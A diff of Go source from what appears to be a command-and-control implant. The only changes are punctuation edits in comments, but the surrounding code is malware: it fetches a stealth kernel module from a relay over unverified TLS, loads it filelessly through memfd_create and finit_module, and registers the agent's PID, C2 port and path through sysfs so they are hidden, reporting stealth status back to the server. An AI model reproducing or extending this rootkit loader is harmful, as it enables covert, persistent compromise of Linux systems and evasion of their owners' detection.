@@ -5,7 +5,7 @@ package ttp
 // Design principle: K-series runs in a background goroutine independently of the server.
 // The agent connects directly to relay:9444 (KCC HTTPS), downloads bat-stealth.ko,
 // loads it via memfd_create+finit_module, and registers via sysfs.
-// The server is not in the data path — it only learns about stealth via [stealth_active]
+// The server is not in the data path   it only learns about stealth via [stealth_active]
 // in the next check-in.
 //
 // Permanent failures (no retry): kernel < 6.x, EPERM, sha256 mismatch.
@@ -36,7 +36,7 @@ const (
 	stealthFlagPath = "/run/.svc_perf.lock"
 )
 
-// Pending stealth report — set by K-series goroutine, consumed by beacon loop.
+// Pending stealth report   set by K-series goroutine, consumed by beacon loop.
 // Uses TTP 1000 as the pseudo-TTP number so the beacon loop can forward it to the server.
 var (
 	stealthMu     sync.Mutex
@@ -63,7 +63,7 @@ func setPendingStealthReport(ttp int, result string) {
 }
 
 // Linux syscall numbers for memfd_create, finit_module, delete_module.
-// Resolved at runtime via GOARCH — no build tags needed since the binary
+// Resolved at runtime via GOARCH   no build tags needed since the binary
 // is compiled for exactly one target architecture.
 func sysnrMemfdCreate() uintptr {
 	if runtime.GOARCH == "arm64" {
@@ -102,7 +102,7 @@ func StartKSeries(kccAddr, secret, c2Port, agentPath string) {
 	// K-00: kernel fingerprint (local, no network)
 	kver, arch, ok := kernelFingerprint()
 	if !ok {
-		// kernel < 6.x or unrecognized — permanent skip, report back
+		// kernel < 6.x or unrecognized   permanent skip, report back
 		setPendingStealthReport(1000, "[stealth_skip: kernel<6.x]")
 		return
 	}
@@ -144,7 +144,7 @@ func StartKSeries(kccAddr, secret, c2Port, agentPath string) {
 		}
 
 		// K-02: register PID, port, path with the loaded module via sysfs
-		// Retry up to 3x — module may still be initializing its sysfs interface
+		// Retry up to 3x   module may still be initializing its sysfs interface
 		registered := false
 		for i := 0; i < 3; i++ {
 			if err := registerSysfs(os.Getpid(), c2Port, agentPath); err == nil {
@@ -154,7 +154,7 @@ func StartKSeries(kccAddr, secret, c2Port, agentPath string) {
 			time.Sleep(time.Second)
 		}
 
-		// Success — mark stealth active regardless of sysfs registration result.
+		// Success   mark stealth active regardless of sysfs registration result.
 		// If sysfs failed, module is loaded but agent is not yet hidden; that will be
 		// caught on the next K-02 retry (if we implement one) or by the operator.
 		_ = registered
@@ -230,7 +230,7 @@ func requestKO(kccAddr, secret, kver, arch string) ([]byte, string, error) {
 	client := &http.Client{
 		Timeout: 620 * time.Second,
 		Transport: &http.Transport{
-			// KCC uses self-signed TLS — same pattern as the server
+			// KCC uses self-signed TLS   same pattern as the server
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
 		},
 	}
@@ -264,9 +264,9 @@ func requestKO(kccAddr, secret, kver, arch string) ([]byte, string, error) {
 }
 
 // loadKO loads the kernel module via memfd_create + finit_module.
-// No file is created on the filesystem — stealth-optimal path.
+// No file is created on the filesystem   stealth-optimal path.
 func loadKO(koBytes []byte, expectedSha256 string) error {
-	// Verify SHA256 before calling into the kernel — permanent abort on mismatch
+	// Verify SHA256 before calling into the kernel   permanent abort on mismatch
 	sum := sha256.Sum256(koBytes)
 	actual := fmt.Sprintf("%x", sum)
 	if actual != expectedSha256 {
@@ -304,7 +304,7 @@ func loadKO(koBytes []byte, expectedSha256 string) error {
 		return permanentKSeriesErr{fmt.Errorf("finit_module: EPERM (no CAP_SYS_MODULE)")}
 	}
 	if errno == syscall.EEXIST {
-		// Module already loaded — treat as success
+		// Module already loaded   treat as success
 		return nil
 	}
 	if errno != 0 {
@@ -317,7 +317,7 @@ func loadKO(koBytes []byte, expectedSha256 string) error {
 // Executed immediately after finit_module while the sysfs interface initializes.
 // hide_port uses append semantics: each write adds one port to the hidden set.
 //
-// Uses os.OpenFile(O_WRONLY) — not os.WriteFile — to avoid O_TRUNC which causes
+// Uses os.OpenFile(O_WRONLY)   not os.WriteFile   to avoid O_TRUNC which causes
 // sysfs store callbacks to receive a spurious truncate before the write payload.
 func registerSysfs(pid int, c2Port, agentPath string) error {
 	writes := []struct{ path, val string }{
